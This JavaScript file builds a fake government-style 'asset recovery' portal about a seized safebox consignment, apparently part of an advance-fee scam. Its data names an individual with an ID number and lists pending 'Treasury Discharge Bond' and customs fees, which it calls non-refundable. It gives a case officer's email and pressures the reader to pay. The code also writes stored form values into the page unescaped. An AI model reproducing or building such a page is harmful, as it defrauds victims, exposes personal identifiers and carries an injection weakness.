const content = document.querySelector('div#content')
const localstorage = JSON.parse(localStorage.getItem('formSubmissionData'));
const fontsize = '1.3em'
const assetRecoveryData = {

    header: "🏛 Privacy & Asset Recovery Official Portal",

    sections: [
        {
            title: "📌 Profile Information",
            fields: [
                { label: "Full Name", value: "PAUL D. MOONEY" },
                { label: "Identification (Passport/ID No.)", value: "AD012916S" },
                { label: "Nationality / Citizenship", value: "USA" },
                { label: "Contact Address", value: "Coeur d'Alene, Idaho, US" },
                { label: "Profile Photo", value: "[Reserved Space]" }
            ]
        },

        {
            title: "📂 Case Information",
            fields: [
                { label: "Date of Seizure", value: "July 07, 2024" },
                { label: "Reference Code", value: "USC-TD/654327/INTL-AU-US/EWR" },
                { label: "Consignment Tracking ID", value: "AUS/PKG/SBX/237-0049-EWR" },
                { label: "Verified Ownership", value: "HELEN FOLASADE ADU" },
                { label: "Delivery Agent", value: "Australian Private SafeBox Company" },
                { label: "Destination Country", value: "United States of America" },
                { label: "Port of Entry", value: "Newark Liberty International Airport (EWR), New Jersey" },
                { label: "Consignment Type", value: "Secured Private SafeBox and Briefcase" },
                { label: "Declared Contents", value: "Personal High-Value Assets (Verified under Category B Clearance)" }
            ],
            statusSection: {
                title: "Current Status",
                options: [
                    { label: "Pending Payment", checked: false },
                    { label: "In Progress", checked: false },
                    { label: "Closed", checked: false },
                    { label: "Approved for Delivery", checked: false }
                ]
            }
        },

        {
            title: "🗄 Seized Property Records",
            subsections: [
                {
                    title: "SafeBox Description",
                    fields: [
                        { label: "Dimensions", value: "14 × 14 × 14 inches" },
                        { label: "Approximate Weight", value: "120 lbs" }
                    ]
                },
                {
                    title: "Briefcase Description",
                    fields: [
                        { label: "Dimensions", value: "30 × 15 × 8 inches" },
                        { label: "Approximate Weight", value: "63–67 lbs" }
                    ]
                }
            ]
        },

        {
            title: "📑 Requested Documentation",
            items: [
                { status: "✅", label: "Verified ownership documents", note: "(Provided)" },
                { status: "⏳", label: "Treasury Discharge Bond Fee", note: "(In Progress)" },
                { status: "⏳", label: "Proof of Customs Duty Payment", note: "(In Progress)" },
                { status: "☐", label: "Shipment Authorization Documentation", note: "(Pending Approval)" }
            ]
        },

        {
            title: "⚖ Legal Basis of Seizure",
            fields: [
                { label: "Authority/Warrant Reference", value: "569903CQ" },
                { label: "Regulation / Law Cited", value: "Washington, D.C. Jurisdiction" },
                { label: "Reason for Seizure", value: "Clearance requires government approval and proper documentation to ensure legal immunity, controlled entry, and compliance with asset recovery regulations." }
            ]
        },

        {
            title: "✍ Contact Information",
            fields: [
                { label: "Case Officer", value: "Tom Hanson" },
                { label: "Email", value: "t.hanson@pacificwest.com" }
            ]
        },

        {
            title: "📌 Advisory Note",
            content: "In order to ensure timely resolution and release of the consignment, the client is required to comply fully with agency instructions, provide the necessary supporting documents, and finalize all outstanding financial obligations. Outstanding clearance fees are classified as non-refundable. Continued cooperation ensures expedited legal processing and protects the client's rights under prevailing asset recovery and customs enforcement regulations."
        },

        {
            title: "⚠ Disclaimer",
            content: "This portal is designated for high-level asset recovery cases only. It serves as the official administrative channel for status updates and must be presented in the event of compliance inquiries, hearings, or legal review related to the seized consignment."
        }
    ]
};

function createInfoCard() {
    const wrapper = document.createElement('section');
    const header = document.createElement('h1');
    const lineDivider = document.createElement('div');
    const infoWrapper = document.createElement('div');

    lineDivider.classList.add('dividerline')
    lineDivider.innerHTML = "&nbsp;"
    infoWrapper.id = 'infomessage';


    wrapper.append(header, lineDivider, infoWrapper);
    wrapper.style.marginBlockEnd = '3em';
    return wrapper;
};
/**
 * @param {string} spaceedString 
 */
function combineString(spacedString, includeAccent = false) {
    if (typeof spacedString !== 'string') return null;

    if (includeAccent === false) {
        // 1) remove emoji/symbols/punctuation but keep letters, numbers and whitespace
        //    requires engines that support Unicode property escapes (\p{...})
        const cleaned = spacedString
            .normalize('NFKD')                // decompose accents (optional)
            .replace(/\p{M}/gu, '')           // remove combining marks (accents)
            .replace(/[^\p{L}\p{N}\s]/gu, '') // keep only Letters, Numbers and whitespace
            .trim();
        return cleaned.split(/\s+/).join('');
    } else {
        function combineString(spacedString) {
            if (typeof spacedString !== 'string') return null;
            // remove anything that's NOT a Unicode letter, number or whitespace
            const cleaned = spacedString.replace(/[^\p{L}\p{N}\s]+/gu, '').trim();
            return cleaned.split(/\s+/).join('');
        };
    };
};

document.addEventListener('DOMContentLoaded', function () {
    // Create a card for each section in assetRecoveryData
    assetRecoveryData.sections.forEach(section => {
        const sectionCard = createInfoCard();
        const sectionHeader = sectionCard.querySelector('h1');
        const sectionInfoContainer = sectionCard.querySelector('#infomessage');

        sectionHeader.textContent = section.title;
        sectionCard.id = combineString(section.title);

        const sectionList = document.createElement('ul');
        sectionList.style.display = 'grid';
        sectionList.style.gap = '5px';

        // Display personal info
        if (section.title.includes('Profile') && section.title.includes('Information')) {
            if (localstorage.length === 0) {
                const noDataItem = document.createElement('p');
                noDataItem.textContent = 'No data found in our database.';
                content.appendChild(noDataItem);
            } else {
                if (typeof localstorage === 'object') {
                    for (const [key, value] of Object.entries(localstorage)) {
                        if (value === '' || value === null || value === undefined) {
                            continue;
                        }
                        const item = document.createElement('li');
                        item.innerHTML = `<strong>${key}:</strong> <pre style="display:inline; font-size:${fontsize}; margin-left:0.5em; word-wrap:break-word; white-space:pre-wrap; max-width:100%;">${value}</pre>`;
                        sectionList.appendChild(item);
                    }
                }
            };
        };

        // Handle different section types
        if (section.fields) {
            section.fields.forEach(field => {
                const fieldItem = document.createElement('li');
                fieldItem.innerHTML = `<strong>${field.label}:</strong> <pre style="display:inline; font-size:${fontsize}; margin-left:0.5em; word-wrap:break-word; white-space:pre-wrap; max-width:100%;">${field.value}</pre>`;
                if (section.title.includes('Profile') && section.title.includes('Information')) return;
                sectionList.appendChild(fieldItem);
            });
        };

        if (section.content) {
            const contentItem = document.createElement('li');
            contentItem.innerHTML = `<strong>Content:</strong> <pre style="display:inline; font-size:${fontsize}; margin-left:0.5em; word-wrap:break-word; white-space:pre-wrap; max-width:100%;">${section.content}</pre>`;
            sectionList.appendChild(contentItem);
        };

        if (section.items) {
            section.items.forEach(item => {
                const itemLi = document.createElement('li');
                itemLi.innerHTML = `<strong>${item.label}:</strong> <pre style="display:inline; font-size:${fontsize}; margin-left:0.5em; word-wrap:break-word; white-space:pre-wrap; max-width:100%;">${item.status} ${item.note}</pre>`;
                sectionList.appendChild(itemLi);
            });
        };

        if (section.subsections) {
            section.subsections.forEach(subsection => {
                const subTitleItem = document.createElement('li');
                subTitleItem.innerHTML = `<strong>${subsection.title}</strong>`;
                sectionList.appendChild(subTitleItem);

                subsection.fields.forEach(field => {
                    const subFieldItem = document.createElement('li');
                    subFieldItem.innerHTML = `<strong>${field.label}:</strong> <pre style="display:inline; font-size:${fontsize}; margin-left:0.5em; word-wrap:break-word; white-space:pre-wrap; max-width:100%;">${field.value}</pre>`;
                    sectionList.appendChild(subFieldItem);
                });
            });
        };

        if (section.statusSection) {
            const statusTitleItem = document.createElement('li');
            statusTitleItem.innerHTML = `<strong>${section.statusSection.title}</strong>`;
            sectionList.appendChild(statusTitleItem);

            section.statusSection.options.forEach(option => {
                const statusItem = document.createElement('span');
                statusItem.innerHTML = `${option.checked ? '☑' : '☐'} ${option.label}`;
                statusItem.style.padding = '0.3em';
                statusItem.style.border = '1px solid #ccc';
                statusItem.style.borderRadius = '3px';
                sectionList.appendChild(statusItem);
            });
        };

        // Add Asset Button
        if (section.title.includes('Requested') && section.title.includes('Document')) {
            const button = document.createElement('button');
            button.textContent = "Check your Asset Status here  --->"
            button.onclick = () => window.open('../HTML pages/RSGatewayRW1976.html');
            sectionList.appendChild(button);
        };

        sectionInfoContainer.appendChild(sectionList);

        if (typeof content !== 'undefined') {
            content.appendChild(sectionCard);
        };
    });
});



